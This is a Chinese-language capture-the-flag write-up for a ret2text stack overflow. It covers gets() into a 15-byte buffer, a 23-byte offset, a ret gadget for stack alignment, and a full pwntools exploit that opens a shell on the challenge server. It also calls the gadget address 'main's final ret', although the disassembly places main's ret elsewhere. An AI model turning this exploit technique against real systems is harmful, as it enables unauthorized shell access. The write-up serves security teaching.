# RIP — ret2text 栈溢出题解

## 一、题目概述

这是一道经典的 **ret2text** 栈溢出题目。程序中存在一个未被调用的后门函数 `fun`，它会执行 `system("/bin/sh")`。我们的目标是通过栈溢出，劫持程序控制流，跳转到这个后门函数，从而获取 shell。

---

## 二、二进制基本信息

```bash
$ file rip_bin
rip_bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, not stripped
```

| 属性 | 值 |
|------|----|
| 架构 | ELF 64-bit x86-64 |
| 链接方式 | 动态链接 |
| 符号 | 未剥离（not stripped） |
| 保护 | 无 PIE（地址固定）、无 Canary |

---

## 三、逆向分析

### 3.1 main 函数

```asm
0000000000401142 <main>:
  401142:  push   rbp
  401143:  mov    rbp, rsp
  401146:  lea    rdi, [0x402004]      # "please input"
  40114d:  call   401030 <puts@plt>
  401152:  lea    rax, [rbp-0xf]       # 缓冲区起始地址 = rbp - 15
  401156:  mov    rdi, rax
  40115b:  call   401050 <gets@plt>    # 危险！gets() 不检查长度
  401160:  lea    rdi, [0x402012]      # "ok,bye!!!"
  401167:  call   401030 <puts@plt>
  40116c:  mov    eax, 0x0
  401171:  leave
  401172:  ret
```

**关键点**：
- 缓冲区 `buf` 位于 `rbp-0xf`，只有 **15 字节**
- 使用 `gets()` 读取输入——**不检查长度，可以无限写入**
- 这就是漏洞所在：**栈缓冲区溢出**

### 3.2 fun 函数（后门）

```asm
0000000000401186 <fun>:
  401186:  push   rbp
  401187:  mov    rbp, rsp
  40118a:  lea    rdi, [0x40201b]      # "/bin/sh"
  401191:  call   401040 <system@plt>  # system("/bin/sh")
  401196:  nop
  401197:  pop    rbp
  401198:  ret
```

**关键点**：
- `main` 中从未调用过 `fun`，但 `fun` 里面直接执行了 `system("/bin/sh")`
- 字符串 `"/bin/sh"` 已经在二进制中，地址为 `0x40201b`
- 我们只需让程序跳转到 `fun`，就能拿到 shell

### 3.3 字符串确认

```bash
$ strings rip_bin | grep sh
/bin/sh
```

---

## 四、漏洞利用

### 4.1 栈布局分析

```
高地址
┌──────────────────┐
│    返回地址       │  ← 覆盖目标
├──────────────────┤
│   saved rbp      │  ← 8 字节
├──────────────────┤
│                  │
│   buf (15字节)    │  ← rbp - 0xf，gets() 写入的起点
│                  │
└──────────────────┘
低地址
```

`gets()` 从 `rbp-0xf` 开始写入，我们可以一直写到返回地址。

### 4.2 计算偏移量

从 `buf` 到返回地址的距离：

```
偏移 = buf 到 saved rbp 的距离 + saved rbp 的大小
     = 0xf (15字节) + 8 (字节)
     = 23 字节
```

所以：**先填充 23 字节垃圾数据，然后覆盖返回地址为 `fun` 的地址**。

### 4.3 栈对齐问题（踩坑点）

第一次尝试的 payload：

```python
payload = b'A' * 23 + p64(0x401186)  # 直接跳转到 fun
```

结果：**Segmentation Fault（core dumped）**

#### 为什么会崩溃？

在 x86-64 Linux 中，`system()` 函数内部使用 SSE 指令（如 `movaps`），这些指令要求栈指针 **RSP 必须是 16 字节对齐的**。

正常函数调用时，`call` 指令会先压入返回地址（RSP -= 8），然后进入函数。编译器生成的代码会保证在调用子函数前 RSP 是对齐的。

但通过栈溢出劫持控制流时，RSP 的对齐状态可能与正常调用不同，差了 8 字节。当 `system()` 内部执行 `movaps` 等对齐指令时，就会触发 **SIGSEGV**。

#### 解决方案：ret gadget

在跳转到 `fun` 之前，先执行一次 `ret` 指令。`ret` 会从栈上弹出 8 字节到 RIP，相当于 RSP += 8，从而修正对齐。

```
执行流程：
main 的 ret
    → 跳转到 ret gadget（0x401185）    ← 第一次返回，修正对齐
        → ret gadget 执行 ret
            → 跳转到 fun（0x401186）    ← 第二次返回，对齐正确
                → system("/bin/sh")     ← 成功！
```

ret gadget 可以从程序中任意一个 `ret` 指令取，这里用 `main` 末尾的 `ret`：

```asm
401185:  c3    ret    # 这就是我们的 ret gadget
```

### 4.4 最终 Payload

```python
from pwn import *

fun_addr   = 0x401186   # 后门函数 fun 的地址
ret_gadget = 0x401185   # main 末尾的 ret 指令，用于栈对齐

# 23 字节填充 + ret gadget + fun 地址
payload = b'A' * 23 + p64(ret_gadget) + p64(fun_addr)
```

对应的栈布局：

```
高地址
┌──────────────────┐
│  fun_addr (8B)   │  ← 第二次 ret 弹出到 RIP → 跳转到 fun
├──────────────────┤
│ ret_gadget (8B)  │  ← 第一次 ret 弹出到 RIP → 执行 ret
├──────────────────┤
│   saved rbp      │  ← 8 字节填充
├──────────────────┤
│   buf (15B)      │  ← 15 字节填充
└──────────────────┘
低地址
```

---

## 五、完整 Exploit

```python
from pwn import *

# 目标地址
fun_addr   = 0x401186   # system("/bin/sh")
ret_gadget = 0x401185   # ret 指令，修正栈对齐

# 构造 payload
payload = b'A' * 23 + p64(ret_gadget) + p64(fun_addr)

# 本地调试
# io = process("./rip_bin")

# 远程连接
io = remote("xxx.tcp-ctf2.dasctf.com", 9999, ssl=True)

io.sendline(payload)
io.interactive()
```

拿到 shell 后执行 `cat flag` 即可获取 flag。

---

## 六、知识点总结

| 知识点 | 说明 |
|--------|------|
| **漏洞类型** | 栈缓冲区溢出（`gets` 无长度检查） |
| **利用技术** | ret2text（跳转到程序自身的代码片段） |
| **偏移计算** | buf 大小 + saved rbp 大小 = 溢出到返回地址的字节数 |
| **栈对齐** | x86-64 的 `system()` 要求 16 字节对齐，用 ret gadget 修正 |
| **ret gadget** | 程序中任意一个 `ret` 指令（`0xC3`），用于调整 RSP 对齐 |
| **strings** | `/bin/sh` 字符串已在二进制中，无需自己注入 |
